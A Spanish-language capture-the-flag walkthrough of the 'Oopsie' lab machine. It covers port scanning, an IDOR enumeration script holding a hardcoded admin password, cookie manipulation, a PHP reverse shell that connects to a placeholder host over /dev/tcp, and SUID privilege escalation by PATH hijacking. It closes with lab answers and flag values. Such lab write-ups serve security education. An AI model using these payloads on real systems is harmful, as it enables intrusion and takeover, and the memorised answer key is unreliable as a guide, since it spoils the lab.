# Oopsie

### 1. 📝 **Introducción**

* **Nivel de Dificultad**: Muy fácil.
* **Tags:**&#x20;
  * **PHP**: Lenguaje de programación utilizado en aplicaciones web personalizadas.
  * **Apache**: Servidor web ampliamente utilizado para alojar aplicaciones web.
  * **Reconnaissance**: Fase de recopilación de información para descubrir la estructura del sitio web.
  * **Cookie Manipulation**: Alteración de cookies para eludir medidas de seguridad.
  * **SUID Exploitation**: Explotación de archivos con el bit SUID establecido para escalar privilegios.
  * **Authentication Bypass**: Evasión de mecanismos de autenticación.
  * **Clear Text Credentials**: Credenciales transmitidas en texto plano, sin cifrado.
  * **Arbitrary File Upload**: Subida de archivos maliciosos para comprometer un sistema.
  * **Insecure Direct Object Reference (IDOR)**: Acceso no autorizado a objetos o recursos a través de referencias directas inseguras.
  * **Path Hijacking**: Manipulación de rutas para ejecutar archivos maliciosos o acceder a información sensible.

### 2. 🛠️ **Entorno**

Nos descargamos nuestra VPN y nos conectamos.

```
sudo openvpn nombre_del_archivo.vpn
```

Iniciamos la máquina y verificamos la conexión.

```bash
ping -c 1 10.129.245.165
```

<figure><img src="../../../.gitbook/assets/image (564).png" alt=""><figcaption></figcaption></figure>

Observamos que tenemos conexión y que es una máquina **Linux** ya que su **ttl=63**.

### 3. 🔍 **Reconocimiento**

A continuación, se realiza el comando:

```bash
nmap -p- --min-rate 5000 -sV 10.129.245.165
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../../.gitbook/assets/image (565).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo el puerto **22** perteneciente al servicio **SSH** y el puerto **80** perteneciente al servicio **HTTP** están abiertos, por lo que se procederá a indagar más.

<figure><img src="../../../.gitbook/assets/image (566).png" alt=""><figcaption></figcaption></figure>

Revisando el código fuente encontramos esto interesante.

![](<../../../.gitbook/assets/image (567).png>)&#x20;

Probemos acceder a: [http://10.129.245.165/cdn-cgi/login/](http://10.129.245.165/cdn-cgi/login/). Tenemos permisos y hemos encontrado otra página que es un panel de **Login**.

<figure><img src="../../../.gitbook/assets/image (568).png" alt=""><figcaption></figcaption></figure>

Las credenciales son las de la máquina anterior de **Archetype** por lo que iniciamos sesión.

<figure><img src="../../../.gitbook/assets/image (569).png" alt=""><figcaption></figcaption></figure>

En las demás páginas, encontramos información sobre la marca y los clientes. Sin embargo, no podemos acceder a la página de **Uploads** porque no tenemos los permisos necesarios; se requieren derechos de **super administrador**.

> El parámetro `id` en la URL parece indicar que `id=1` corresponde al Administrador.

¿Podríamos obtener información sobre el usuario **super admin** si logramos adivinar su id? Probemos con el siguiente script en Python:

```python
#!/bin/python3

import requests
import signal
import threading
import logging
import sys

def def_handler(sig, frame):
    print("\n[!] Deteniendo el proceso...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://10.129.245.165/cdn-cgi/login/index.php"
accounts_url = "http://10.129.245.165/cdn-cgi/login/admin.php?content=accounts&id="

def makeRequest():
    s = requests.session()

    post_data = {
        'username': 'admin',
        'password': 'MEGACORP_4dm1n!!'
    }

    p = s.post(login_url, data=post_data)
    for x in range(100):
        print(f"[+] Probando id: {x}")
        r = s.get(accounts_url + str(x))
        if 'super' in r.text:
            print(f"[+] Id del super admin encontrado: {x}")
            break

if __name__ == '__main__':
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        logging.error(str(e))
```

Al ejecutar el código, vemos que el id del super admin es **30**, ya que la respuesta contiene la palabra **super**.

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://10.129.245.165/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

<figure><img src="../../../.gitbook/assets/image (575).png" alt=""><figcaption></figcaption></figure>

Es posible que el desarrollador haya olvidado implementar la validación de entrada de usuario, por lo que deberíamos probar si podemos subir otros archivos, como una shell web en PHP.

Logramos subir la siguiente reverse shell en PHP (`shell.php`):

```php
<?php
  exec("/bin/bash -c 'bash -i &> /dev/tcp/YOUR_IP/443 0<&1'");
?>
```

Durante nuestra enumeración del sitemap con **Disbuster**, encontramos un directorio llamado `/uploads`, que probablemente contenga el archivo que subimos.

Ahora, iniciamos un listener en el puerto 443 con:

```bash
nc -lvnp 443
```

<figure><img src="../../../.gitbook/assets/image (570).png" alt=""><figcaption></figcaption></figure>

### 5. 🔑 **Captura de la Flag**

Una vez dentro investigamos distintos directorios para ver donde se encuentra la flag. La flag se encuentra en el directorio `/home/robert.`

<figure><img src="../../../.gitbook/assets/image (571).png" alt=""><figcaption></figcaption></figure>

Debemos escalar privilegios para encontrar la flag del **root**. Parece ser las credenciales para conectarnos a través de **SSH**.

<figure><img src="../../../.gitbook/assets/image (572).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (573).png" alt=""><figcaption></figcaption></figure>

Pertenece al grupo **bugtracker**.

<figure><img src="../../../.gitbook/assets/image (574).png" alt=""><figcaption></figcaption></figure>

Hacemos estos comandos en robert.

```bash
cd /tmp
echo "/bin/bash" > cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker
```

Tras ejecutarlo hacemos los siguientes.

```
whoami
vim /root/root.txt
```

> Si ponemos cat /root/root.txt no se mostrará la flag

### 6. ❓Preguntas

#### Tarea 1: ¿Con qué tipo de herramienta se puede interceptar el tráfico web?

**proxy**\
Una herramienta que se utiliza para interceptar y analizar el tráfico web, permitiendo ver y modificar las solicitudes y respuestas entre el cliente y el servidor.

#### Tarea 2: ¿Cuál es la ruta al directorio en el servidor web que devuelve una página de inicio de sesión?

**/cdn-cgi/login**\
Este es el directorio en el servidor web que muestra una página de inicio de sesión, lo que indica un punto de acceso para la autenticación.

#### Tarea 3: ¿Qué se puede modificar en Firefox para obtener acceso a la página de carga?

**cookie**\
Modificar la cookie en Firefox puede proporcionar acceso a la página de carga de archivos que normalmente está restringida.

#### Tarea 4: ¿Cuál es el ID de acceso del usuario administrador?

**34322**\
El ID de acceso del usuario administrador es `34322`, y puede ser usado para acceder a funciones administrativas en el sistema.

#### Tarea 5: Al subir un archivo, ¿en qué directorio aparece ese archivo en el servidor?

**/uploads**\
Los archivos subidos al servidor se almacenan en el directorio `/uploads`, donde pueden ser accesibles o procesados posteriormente.

#### Tarea 6: ¿Qué archivo contiene la contraseña compartida con el usuario robert?

**db.php**\
El archivo `db.php` contiene la contraseña compartida con el usuario `robert`, lo que puede permitir el acceso a la base de datos o a otras áreas del sistema.

#### Tarea 7: ¿Qué ejecutable se usa con la opción "-group bugtracker" para identificar todos los archivos propiedad del grupo bugtracker?

**find**\
El comando `find` se ejecuta con la opción `-group bugtracker` para identificar todos los archivos que pertenecen al grupo `bugtracker`, útil para auditoría o explotación.

#### Tarea 8: Independientemente de qué usuario inicie el ejecutable bugtracker, ¿con qué privilegios de usuario se ejecutará?

**root**\
El ejecutable `bugtracker` se ejecuta con privilegios de `root`, sin importar qué usuario lo inicie, lo que puede ser aprovechado para escalar privilegios.

#### Tarea 9: ¿Qué significa SUID?

**set owner user id**\
El SUID permite que un archivo se ejecute con los privilegios del propietario del archivo, en lugar de los del usuario que lo ejecuta, lo cual es crítico para la escalada de privilegios.

#### Tarea 10: ¿Cuál es el nombre del ejecutable que se llama de manera insegura?

**cat**\
El comando `cat` se llama de manera insegura, permitiendo que un atacante ejecute su propio código malicioso en lugar del comando legítimo.

#### Tarea 11: Enviar bandera de ususario

f2c74ee8db7983851ab2a96a44eb7981

#### Tarea 12: Enviar bandera de root

af13b0bee69f8a877c3faf667f7beacf
